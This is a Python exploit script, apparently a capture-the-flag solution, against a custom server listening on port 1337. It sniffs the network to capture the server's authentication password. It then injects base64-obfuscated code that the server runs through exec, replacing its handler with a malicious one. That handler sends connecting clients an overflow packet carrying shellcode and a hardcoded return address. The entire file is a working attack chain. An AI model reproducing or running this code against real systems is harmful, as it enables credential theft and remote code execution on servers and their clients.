#!/usr/bin/env python3
# coding: utf-8

from scapy.all import sniff, TCP, Raw
import socket
import struct
import sys
import base64
import time
from enum import Enum

password = b""
remaining_len = None


class StopSniff(Exception):
    pass


def f(packet):
    if TCP not in packet:
        return
    if packet[TCP].dport != 1337:
        return
    if Raw not in packet:
        return

    global remaining_len
    data = bytes(packet[Raw])
    if b"\x00\x00\x00\x01" in data:
        data = data[data.find(b"\x00\x00\x00\x01"):]
        (_, remaining_len) = struct.unpack_from(">II", data)
        data = data[8:]
    if remaining_len is not None:
        global password
        pwd_slice = data[:remaining_len]
        password += pwd_slice
        remaining_len -= len(pwd_slice)
    if remaining_len == 0:
        raise StopSniff


def build_malicious_code() -> bytes:
    shellcode = open("shellcode.bin", "rb").read()
    padding = b"\x00" * (1060 - 4 - len(shellcode))
    auth_result_addr = 0x406480
    shellcode_addr = auth_result_addr + 4
    malicious_packet = b"SAAA" + shellcode + \
        padding + struct.pack("<I", shellcode_addr)
    malicious_packet_def = repr(malicious_packet)

    malicious_code_raw = \
        f"""
class MaliciousServer:
    def __init__(self):
        self.server = globals()["SERVER"]

    def handle_connection(self):
        server = self.server
        s, ep = server._loop.run_until_complete(
            server._loop.sock_accept(server._listener))
        server._loop.create_task(self._handle_connection_impl(s, ep))

    async def _handle_connection_impl(self, s: socket, ep):
        server = self.server
        try:
            await server.tlv_recv(s, Operation.AUTH_DATA)
            await server.tlv_send(s, "Success", Operation.AUTH_RESULT)
            await server.tlv_recv(s, Operation.CODE_DATA)
            await self.tlv_send_bytes(s, {malicious_packet_def}, Operation.AUTH_RESULT)
        except Exception as e:
            pass
        finally:
            s.close()

    async def tlv_send_bytes(self, s: socket, data: bytes, _type: Operation):
        server = self.server
        header = struct.pack(">II", _type.value, len(data))
        await server._loop.sock_sendall(s, header + data)

    def __repr__(self):
        return ">:)"

globals()["SERVER"] = MaliciousServer()
"""

    malicious_code_b64 = base64.b64encode(malicious_code_raw.encode())
    malicious_code_b64_def = repr(malicious_code_b64)
    return f'[exec(__import__("base64").b64decode({malicious_code_b64_def}).decode())][0]'


def obtain_password() -> bytes:
    print(f"Sniffing for password...")
    try:
        sniff(1000, prn=f)
    except StopSniff:
        pass
    print(f"Password: {password.decode()}")
    return password


class Operation(Enum):
    AUTH_DATA = 1
    AUTH_RESULT = 2
    CODE_DATA = 3
    CODE_RESULT = 4


def attack_server(addr: str, pwd: bytes):
    print(f"Attacking {addr}...")
    s = socket.create_connection((addr, 1337))
    malicious_code = build_malicious_code().encode()
    s.sendall(struct.pack(">II", Operation.AUTH_DATA.value, len(pwd)) + pwd)
    s.sendall(struct.pack(">II", Operation.CODE_DATA.value,
                          len(malicious_code)) + malicious_code)

    time.sleep(1)
    s.recv(1024)
    s.close()
    print("Done.")


def main():
    if len(sys.argv) < 2:
        print("Usage: exploit.py <server_address> [server_password]")
        return
    addr = sys.argv[1]
    password = obtain_password() if len(sys.argv) < 3 else sys.argv[2].encode()
    attack_server(addr, password)


if __name__ == "__main__":
    main()
